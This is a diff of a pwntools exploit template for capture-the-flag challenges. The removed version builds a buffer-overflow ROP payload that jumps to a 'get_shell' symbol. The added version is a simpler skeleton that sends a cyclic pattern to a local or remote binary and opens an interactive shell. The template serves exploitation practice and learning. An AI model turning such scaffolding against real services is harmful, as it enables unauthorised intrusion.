@@ -1,46 +1,34 @@
-"""This script can be used as a ROPchain template, or any BoF-related challenge
+"""A little script to make pwn easier for me
 
-Donn't forget to change the code for architecture, 32 or 64 bits files
+Use it like:
+python python-rop-template.py
+python python-rop-template.py REMOTE
+python python-rop-template.py GDB
+
+If you love verbose add DEBUG flag
 """
 
 from pwn import *
 
-# Size of the buffer to exploit
-N = 28
+# Some data to change
+file = "./bin"
+host = "challs.io"
+port = 1337
+until = b">>> "
 
-# Test locally or remotely
-is_remote = False
-
-# URL, port for remote
-(URL, PORT) = ("", 0)
-
-# Binary file to exploit
-BIN_FILE = "./"
-
-# Assuming it's an ELF 64 bits
-bin_file = ELF(BIN_FILE)
-
-# Recieve binary input until
-RECV_UNTIL = ">>> "
-
-if is_remote:
-    proc = remote(URL, port)
+# Parsing args
+if args['REMOTE']:
+    p = remote(host, port)
 else:
-    proc = process(bin_file.file.name)
+    p = process(file)
 
-# Get your symbols
-func_1 = p32(bin_file.symbols["function_one"])
-shell = p32(bin_file.symbols["get_shell"])
+# Attaching if wanted
+if args["GDB"]:
+    gdb.attach(p)
 
-# Build your payload
-payload = cyclic(N+4)
-payload += func_1
-payload += shell
+# Payload crafting
+pay = cyclic(100)
 
-# I/O of binary, send payload and get interactive
-proc.recvuntil(RECV_UNTIL)
-proc.sendline(payload)
-proc.interactive()
-
-if __name__ == "__main__":
-    main()
+# Sending payload
+p.sendlineafter(until, pay)
+p.interactive()
